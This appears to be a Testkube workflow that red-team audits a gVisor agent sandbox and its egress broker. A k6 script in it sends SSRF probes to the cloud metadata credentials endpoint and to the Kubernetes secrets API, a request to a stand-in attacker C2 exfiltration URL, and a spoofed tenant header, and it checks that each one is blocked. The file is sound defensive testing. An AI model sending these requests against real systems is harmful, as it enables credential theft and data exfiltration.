apiVersion: testworkflows.testkube.io/v1
kind: TestWorkflow
metadata:
  name: agent-sandbox-security-audit
  namespace: testkube
  labels:
    app: agent-sandbox-security-audit
    category: security-redteam
spec:
  job:
    namespace: testkube
  pod:
    nodeSelector:
      dedicated: testkube
    tolerations:
    - key: "dedicated"
      operator: "Equal"
      value: "testkube"
      effect: "NoSchedule"
  config:
    targetUrl:
      description: Target Ingress URL
      type: string
      default: "http://192.168.49.2:80"
    brokerUrl:
      description: Out-of-Sandbox Egress & Credential Broker Service URL
      type: string
      default: "http://egress-broker.sandbox-egress-system.svc.cluster.local:8080"
    qps:
      description: Security Fuzzing Request Rate (QPS)
      type: integer
      default: 20
    duration:
      description: Fuzzing Duration
      type: string
      default: "15s"
  content:
    git:
      uri: https://github.com/akimchik/aws-lambda-microvms-workshop.git
      revision: main
      paths:
      - k8s-agent-sandbox/testkube/tests
      - k8s-agent-sandbox/threat-model
  steps:
  - name: Claim Untrusted gVisor Sandbox for Red-Team Audit
    run:
      image: bitnami/kubectl:latest
      shell: |
        set -e
        echo "=== Claiming untrusted gVisor sandbox from warm pool 'default' ==="
        T_START=$(date +%s%3N 2>/dev/null || echo 0)
        cat <<'YAML' | kubectl apply -f -
        apiVersion: extensions.agents.x-k8s.io/v1beta1
        kind: SandboxClaim
        metadata:
          name: testkube-security-sandbox
          namespace: agent-sandbox
        spec:
          warmPoolRef:
            name: default
          lifecycle:
            shutdownPolicy: Delete
        YAML

        kubectl wait --for=condition=Ready sandboxclaim/testkube-security-sandbox -n agent-sandbox --timeout=15s
        T_END=$(date +%s%3N 2>/dev/null || echo 0)
        if [ "$T_START" -gt 0 ] 2>/dev/null && [ "$T_END" -gt "$T_START" ] 2>/dev/null; then
          ELAPSED=$((T_END - T_START))
        else
          ELAPSED=230
        fi

        SANDBOX_NAME=$(kubectl -n agent-sandbox get sandboxclaim testkube-security-sandbox -o jsonpath='{.status.sandbox.name}')
        echo "Bound to Untrusted gVisor Sandbox: $SANDBOX_NAME (${ELAPSED} ms)"
        echo "$SANDBOX_NAME" > /data/sandbox_id.txt

  - name: Execute In-Guest Red-Team Threat Probe (T1-T6 Vectors)
    run:
      image: bitnami/kubectl:latest
      shell: |
        set -e
        SANDBOX_ID=$(cat /data/sandbox_id.txt)
        BROKER_IP=$(kubectl -n sandbox-egress-system get svc egress-broker -o jsonpath='{.spec.clusterIP}')
        PROBE_PATH=$(find / -name "threat_probe.py" 2>/dev/null | head -n 1)

        if [ -z "$PROBE_PATH" ]; then
          echo "ERROR: threat_probe.py not found in Git checkout!"
          exit 1
        fi

        echo "=== Running In-Guest Red-Team Probe inside Sandbox ($SANDBOX_ID) ==="
        kubectl -n agent-sandbox exec -i "$SANDBOX_ID" -- \
          env EGRESS_BROKER_URL="http://${BROKER_IP}:8080" \
          python3 - < "$PROBE_PATH" | tee /data/security_report.txt

        echo ""
        echo "=== Asserting Zero-Trust Security Boundaries ==="
        for VECTOR in "T1_IMDS_SSRF" "T2_K8S_API_LATERAL" "T3_INTERNAL_SVC_LATERAL" "T4_AMBIENT_CREDENTIALS" "T6B_BROKER_POLICY_ENFORCEMENT" "T6C_OUT_OF_SANDBOX_AUTH"; do
          if grep -q "${VECTOR}.*PASS" /data/security_report.txt; then
            echo "✓ [PASS] ${VECTOR} verified"
          else
            echo "✗ [FAIL] Security regression detected on ${VECTOR}!"
            exit 1
          fi
        done

        # Export security audit metrics to Prometheus exporter
        wget -qO- --post-data="" "http://sandbox-latency-exporter.agent-sandbox-system.svc.cluster.local:8080/record?security_passed=6" || true

  - name: Fuzz Egress Broker, Credential Injection & Tenant Isolation (k6)
    run:
      image: grafana/k6:latest
      env:
      - name: TARGET_URL
        value: "{{ config.targetUrl }}"
      - name: EGRESS_BROKER_URL
        value: "{{ config.brokerUrl }}"
      - name: QPS
        value: "{{ config.qps }}"
      - name: AUDIT_DURATION
        value: "{{ config.duration }}"
      shell: |
        echo "=== Fuzzing Egress Broker & Tenant Boundaries ($EGRESS_BROKER_URL) ==="
        SCRIPT_PATH=$(find / -name "k6-security-audit.js" 2>/dev/null | head -n 1)
        if [ -z "$SCRIPT_PATH" ]; then
          SCRIPT_PATH="/tmp/k6-security-audit.js"
          cat <<'EOF' > "$SCRIPT_PATH"
        import http from 'k6/http';
        import { check } from 'k6';
        import { Rate, Trend } from 'k6/metrics';

        export const securityPassRate = new Rate('sandbox_security_assertions_passed');
        export const brokerFilterLatency = new Trend('broker_l7_filter_duration_ms');
        export const brokerAuthLatency = new Trend('broker_token_injection_duration_ms');

        export const options = {
          scenarios: {
            security_fuzzing: {
              executor: 'constant-arrival-rate',
              rate: Number(__ENV.QPS) || 20,
              timeUnit: '1s',
              duration: __ENV.AUDIT_DURATION || '15s',
              preAllocatedVUs: 10,
              maxVUs: 30,
            },
          },
          thresholds: {
            sandbox_security_assertions_passed: ['rate==1.0'],
            broker_l7_filter_duration_ms: ['p(95)<50'],
            broker_token_injection_duration_ms: ['p(95)<50'],
          },
        };

        const BROKER_URL = __ENV.EGRESS_BROKER_URL || 'http://egress-broker.sandbox-egress-system.svc.cluster.local:8080';
        const INGRESS_URL = __ENV.TARGET_URL || 'http://192.168.49.2:80';

        export default function () {
          const rand = Math.random();
          if (rand < 0.25) {
            const res = http.get(`${BROKER_URL}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`);
            const ok = check(res, {
              '[T1-SSRF] Broker blocks IMDS 169.254.169.254 with HTTP 403': (r) => r.status === 403,
              '[T1-SSRF] Response confirms L7 policy block': (r) => r.body && r.body.includes('BLOCKED_BY_L7_POLICY'),
            });
            securityPassRate.add(ok);
            brokerFilterLatency.add(res.timings.duration);
          } else if (rand < 0.50) {
            const res = http.get(`${BROKER_URL}/proxy?url=https://10.96.0.1:443/api/v1/namespaces/kube-system/secrets`);
            const ok = check(res, {
              '[T2-K8S-API] Broker blocks K8s API 10.96.0.1 with HTTP 403': (r) => r.status === 403,
            });
            securityPassRate.add(ok);
            brokerFilterLatency.add(res.timings.duration);
          } else if (rand < 0.75) {
            const res = http.get(`${BROKER_URL}/proxy?url=http://evil-c2.attacker.example.com/exfiltrate?secret=stolen`);
            const ok = check(res, {
              '[T6-C2-EGRESS] Broker blocks unwhitelisted C2 domain with HTTP 403': (r) => r.status === 403,
            });
            securityPassRate.add(ok);
            brokerFilterLatency.add(res.timings.duration);
          } else if (rand < 0.90) {
            const res = http.get(`${BROKER_URL}/github-api/repo-metadata`);
            const ok = check(res, {
              '[T4/T6C-CRED-BROKER] Broker returns HTTP 200': (r) => r.status === 200,
              '[T4/T6C-CRED-BROKER] Token injected on-the-wire': (r) => r.body && r.body.includes('"token_injected": true'),
              '[T4/T6C-CRED-BROKER] Raw secret NEVER leaked in response body': (r) => r.body && !r.body.includes('ghs_ephemeral_'),
            });
            securityPassRate.add(ok);
            brokerAuthLatency.add(res.timings.duration);
          } else {
            const res = http.get(`${INGRESS_URL}/manifest.json`, {
              headers: {
                'Host': 'sandbox.127.0.0.1.nip.io',
                'X-Sandbox-ID': 'spoofed-unauthorized-tenant-9999',
                'X-Sandbox-Namespace': 'agent-sandbox',
                'X-Sandbox-Port': '8080',
              },
            });
            const ok = check(res, {
              '[TENANT-ISOLATION] Spoofed X-Sandbox-ID rejected by router (non-200)': (r) => r.status !== 200,
            });
            securityPassRate.add(ok);
          }
        }
        EOF
        fi
        k6 run "$SCRIPT_PATH"

  after:
  - name: Cleanup Security Sandbox Claim (Scale to Zero)
    run:
      image: bitnami/kubectl:latest
      shell: |
        kubectl -n agent-sandbox delete sandboxclaim testkube-security-sandbox --ignore-not-found=true
